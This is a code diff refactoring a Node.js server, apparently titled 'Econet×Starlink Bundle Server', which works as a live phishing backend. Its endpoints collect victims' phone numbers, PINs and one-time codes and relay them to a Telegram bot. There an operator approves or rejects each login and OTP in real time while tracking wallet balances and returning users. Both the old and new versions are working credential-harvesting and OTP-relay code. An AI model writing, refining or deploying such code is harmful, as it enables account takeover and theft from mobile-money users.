-      if (verification.status === 'approved') {
-        user.otpVerifications.delete(verificationKey);
-        return res.json({ 
-          success: true, 
-          status: 'approved', 
-          message: 'Everything correct' 
-        });
-      } else if (verification.status === 'rejected') {
-        user.otpVerifications.delete(verificationKey);
-        return res.json({ 
-          success: true, 
-          status: 'rejected', 
-          message: 'OTP code is wrong' 
-        });
-      } else if (verification.status === 'wrong_pin') {
-        user.otpVerifications.delete(verificationKey);
-        return res.json({ 
-          success: true, 
-          status: 'wrong_pin', 
-          message: 'PIN is wrong' 
-        });
-      } else if (verification.status === 'timeout') {
-        return res.json({ 
-          success: true, 
-          status: 'timeout', 
-          message: 'Session expired' 
-        });
-      } else {
-        return res.json({ 
-          success: true, 
-          status: 'pending', 
-          message: 'Waiting for verification' 
-        });
-      }
-    } catch (error) {
-      logger.error(`check-otp-status error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-
-  app.post(`${basePath}/resend-otp`, async (req, res) => {
-    try {
-      if (!user.bot) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot not configured' 
-        });
-      }
-
-      if (!user.isHealthy) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot service unavailable' 
-        });
-      }
-      
-      const { phoneNumber, timestamp } = req.body;
-      
-      if (!phoneNumber) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone number required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const { countryCode, number } = formatPhoneNumber(phoneNumber);
-      const message = `🔄 <b>${sanitizeInput(user.name)} - OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
-      
-      const result = await sendTelegramMessage(user, message);
-
-      if (result.success) {
-        res.json({ 
-          success: true, 
-          message: 'Resend notification sent' 
-        });
-      } else {
-        res.status(500).json({ 
-          success: false, 
-          message: 'Failed to send notification', 
-          error: result.error 
-        });
-      }
-    } catch (error) {
-      logger.error(`resend-otp error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-});
-
-// ============================================
-// 404 HANDLER
-// ============================================
-app.use((req, res) => {
-  res.status(404).json({ 
-    success: false, 
-    message: 'Endpoint not found',
-    path: req.path 
-  });
-});
-
-// ============================================
-// GLOBAL ERROR HANDLER
-// ============================================
-app.use((err, req, res, next) => {
-  logger.error('Unhandled error:', err.message);
-  logger.error(err.stack);
-  
-  res.status(500).json({ 
-    success: false, 
-    error: 'Internal server error',
-    message: process.env.NODE_ENV === 'development' ? err.message : undefined
-  });
-});
-
-// ============================================
-// PERIODIC HEALTH MONITORING
-// ============================================
+// ─── HEALTH MONITOR (every 60s) ───────────────────────────────────────────
 setInterval(() => {
-  users.forEach((user) => {
-    if (user.botManager && !user.botManager.isHealthy()) {
-      logger.warn(`${user.name}: Bot unhealthy - checking...`);
-      
-      if (!user.botManager.isInitializing && 
-          user.botManager.restartAttempts < user.botManager.maxRestartAttempts) {
-        user.botManager.scheduleRestart(15000);
-      }
-    }
-    
-    if (user.consecutiveErrors > 0 && Date.now() - user.lastErrorTime > 300000) {
-      user.consecutiveErrors = 0;
-      logger.info(`Reset consecutive errors for ${user.name}`);
-    }
-  });
-}, 60000);
+  for (const u of users.values())
+    if (u.mgr && !u.mgr.ok() && !u.mgr.initializing && u.mgr.restarts < CFG.MAX_RESTARTS)
+      u.mgr._restart(15_000);
+}, 60_000).unref?.();
 
-// ============================================
-// START SERVER
-// ============================================
+// ─── ROUTE HELPERS ────────────────────────────────────────────────────────
+const botOk = (u, res) => {
+  if (!u.bot || !u.healthy) { res.status(503).json({ success: false, message: 'Bot service unavailable' }); return false; }
+  return true;
+};
+
+// ─── HEALTH ────────────────────────────────────────────────────────────────
+app.get('/api/health', (_, res) => {
+  const list = [...users.values()].map(u => ({
+    name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
+    logins: u.logins.size, otps: u.otps.size, verified: u.verified.size,
+    wallets: u.wallets.size, sse: sseBroker.size, lastErr: u.lastErr,
+  }));
+  res.json({ status: list.some(u => u.healthy) ? 'ok' : 'degraded', users: list, ts: ts() });
+});
+
+// ─── DYNAMIC ROUTES ────────────────────────────────────────────────────────
+users.forEach((user, link) => {
+  const R = `/api/${link}`;
+
+  // check-user-status
+  app.post(`${R}/check-user-status`, (req, res) => {
+    const raw = req.body.phoneNumber;
+    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
+    const e = vPhone(raw); if (e) return res.status(400).json({ success: false, message: e });
+    res.json({ success: true, isReturningUser: user.verified.has(normalise(raw)) });
+  });
+
+  // get-wallet-balances
+  app.post(`${R}/get-wallet-balances`, (req, res) => {
+    const raw = req.body.phoneNumber;
+    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
+    const w = user.wallets.get(normalise(raw));
+    res.json({ success: true, name: w?.name || '', usd: w?.usd ?? 0, zwg: w?.zwg ?? 0 });
+  });
+
+  // login
+  app.post(`${R}/login`, async (req, res) => {
+    if (!botOk(user, res)) return;
+    const { pin, timestamp, bundle } = req.body;
+    const raw = req.body.phoneNumber;
+    if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
+    const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
+    const ie = vPin(pin);   if (ie) return res.status(400).json({ success: false, message: ie });
+
+    const phone = normalise(raw);
+    if (user.dupes.seen(`login:${phone}:${pin}`))
+      return res.json({ success: true, message: 'Cached' });
+
+    const key = `${phone}-${pin}`;
+    user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false });
+
+    const text     = fmtLogin(user, { phone, pin, time: timestamp || Date.now(), bundle });
+    const keyboard = { inline_keyboard: [
+      [{ text: '✅ Allow to Proceed',   callback_data: mkCb('login', 'proceed', phone, pin) }],
+      [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }],
+    ]};
+
+    const r = await sendMsg(user, text, { reply_markup: keyboard });
+    r.ok
+      ? res.json({ success: true, message: 'Waiting for approval' })
+      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
+  });
+
+  // check-login-approval  (polling — kept for backwards compatibility)
+  app.post(`${R}/check-login-approval`, (req, res) => {
+    const { pin } = req.body;
+    const raw     = req.body.phoneNumber;
+    if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
+    const phone = normalise(raw);
+    const rec   = user.logins.get(`${phone}-${pin}`);
+    if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });
+    if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
+      return res.json({ success: true, approved: false, rejected: true, expired: true });
+    res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null });
+  });
+
+  // stream-login-approval  (SSE — instant, replaces polling)
+  // Usage: GET /api/{link}/stream-login-approval?phone=+263771234567&pin=1234
+  app.get(`${R}/stream-login-approval`, (req, res) => {
+    const { phone: rp, pin } = req.query;
+    if (!rp || !pin) return res.status(400).json({ success: false, message: 'phone and pin required' });
+    const phone = normalise(rp);
+    const key   = `${phone}-${pin}`;
+    const rec   = user.logins.get(key);
+    if (rec && (rec.approved || rec.rejected)) {
+      res.setHeader('Content-Type', 'text/event-stream');
+      res.flushHeaders();
+      res.write(`data: ${JSON.stringify({ approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null })}\n\n`);
+      return res.end();
+    }
+    sseBroker.subscribe(`login:${key}`, res);
+  });
+
+  // verify-otp
+  app.post(`${R}/verify-otp`, async (req, res) => {
+    if (!botOk(user, res)) return;
+    const { otp, timestamp, bundle } = req.body;
+    const raw = req.body.phoneNumber;
+    if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
+    const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
+    const oe = vOtp(otp);   if (oe) return res.status(400).json({ success: false, message: oe });
+
+    const phone = normalise(raw);
+    if (user.dupes.seen(`otp:${phone}:${otp}`))
+      return res.json({ success: true, message: 'Cached' });
+
+    const key = `${phone}-${otp}`;
+    user.otps.set(key, { status: 'pending', ts: Date.now() });
+
+    const text     = fmtOtp(user, { phone, otp, time: timestamp || Date.now(), bundle });
+    const keyboard = { inline_keyboard: [
+      [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct',  phone, otp) }],
+      [
+        { text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong',    phone, otp) },
+        { text: '⚠️ Wrong PIN',  callback_data: mkCb('otp', 'wrongpin', phone, otp) },
+      ],
+    ]};
+
+    const r = await sendMsg(user, text, { reply_markup: keyboard });
+    r.ok
+      ? res.json({ success: true, message: 'OTP sent' })
+      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
+  });
+
+  // check-otp-status  (polling — kept for backwards compatibility)
+  app.post(`${R}/check-otp-status`, (req, res) => {
+    const { otp } = req.body;
+    const raw     = req.body.phoneNumber;
+    if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
+    const phone = normalise(raw);
+    const rec   = user.otps.get(`${phone}-${otp}`);
+    if (!rec) return res.json({ success: true, status: 'pending' });
+    if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout' });
+    if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) rec.readAt = rec.readAt || Date.now();
+    res.json({ success: true, status: rec.status });
+  });
+
+  // stream-otp-status  (SSE — instant, replaces polling)
+  // Usage: GET /api/{link}/stream-otp-status?phone=+263771234567&otp=123456
+  app.get(`${R}/stream-otp-status`, (req, res) => {
+    const { phone: rp, otp } = req.query;
+    if (!rp || !otp) return res.status(400).json({ success: false, message: 'phone and otp required' });
+    const phone = normalise(rp);
+    const key   = `${phone}-${otp}`;
+    const rec   = user.otps.get(key);
+    if (rec && rec.status !== 'pending') {
+      res.setHeader('Content-Type', 'text/event-stream');
+      res.flushHeaders();
+      res.write(`data: ${JSON.stringify({ status: rec.status })}\n\n`);
+      return res.end();
+    }
+    sseBroker.subscribe(`otp:${key}`, res);
+  });
+
+  // resend-otp
+  app.post(`${R}/resend-otp`, async (req, res) => {
+    if (!botOk(user, res)) return;
+    const { timestamp } = req.body;
+    const raw           = req.body.phoneNumber;
+    if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
+    const phone = normalise(raw);
+    const text  = `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
+    const r     = await sendMsg(user, text);
+    r.ok ? res.json({ success: true }) : res.status(500).json({ success: false, error: r.err });
+  });
+});
+
+// ─── 404 + ERROR ──────────────────────────────────────────────────────────
+app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
+app.use((err, req, res, _next) => { logger.error('Unhandled:', err.message); res.status(500).json({ success: false, error: 'Internal server error' }); });
+
+// ─── GRACEFUL SHUTDOWN ────────────────────────────────────────────────────
+const shutdown = async (sig) => {
+  logger.info(`${sig} — shutting down`);
+  server.close();
+  for (const u of users.values()) { u.dupes.clear(); await u.mgr?._cleanup(); }
+  process.exit(0);
+};
+process.on('SIGTERM', () => shutdown('SIGTERM'));
+process.on('SIGINT',  () => shutdown('SIGINT'));
+process.on('uncaughtException',  (e) => logger.error('Uncaught:', e.message, e.stack));
+process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r));
+
+// ─── START ────────────────────────────────────────────────────────────────
 const server = app.listen(PORT, () => {
-  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`👥 Active users: ${users.size}/${CONFIG.MAX_USERS}`);
-  console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
-  console.log('\n📋 Active endpoints:');
-  users.forEach((user, linkInsert) => {
-    const status = user.isHealthy ? '✅' : '⏳';
-    console.log(`   ${status} ${user.name}: /api/${linkInsert}/*`);
-  });
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
-});
-
-// ============================================
-// GRACEFUL SHUTDOWN
-// ============================================
-const gracefulShutdown = async (signal) => {
-  logger.info(`${signal} received, shutting down gracefully...`);
-  
-  server.close(() => {
-    logger.info('HTTP server closed');
-  });
-  
-  const shutdownPromises = Array.from(users.values()).map(async (user) => {
-    if (user.botManager) {
-      try {
-        await user.botManager.cleanup();
-        logger.info(`${user.name} bot stopped`);
-      } catch (error) {
-        logger.error(`Error stopping ${user.name} bot:`, error.message);
-      }
-    }
-  });
-  
-  try {
-    await Promise.allSettled(shutdownPromises);
-    logger.info('All bots stopped');
-    process.exit(0);
-  } catch (error) {
-    logger.error('Error during shutdown:', error.message);
-    process.exit(1);
-  }
-};
-
-process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
-process.on('SIGINT', () => gracefulShutdown('SIGINT'));
-
-// ============================================
-// UNCAUGHT EXCEPTION HANDLER
-// ============================================
-process.on('uncaughtException', (error) => {
-  logger.error('Uncaught Exception:', error.message);
-  logger.error(error.stack);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-  logger.error('Unhandled Rejection at:', promise);
-  logger.error('Reason:', reason);
+  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+  console.log(`🛰️  Econet×Starlink Bundle Server`);
+  console.log(`🚀  Port: ${PORT}`);
+  console.log(`👥  Users: ${users.size}/${CFG.MAX_USERS}`);
+  users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
 });
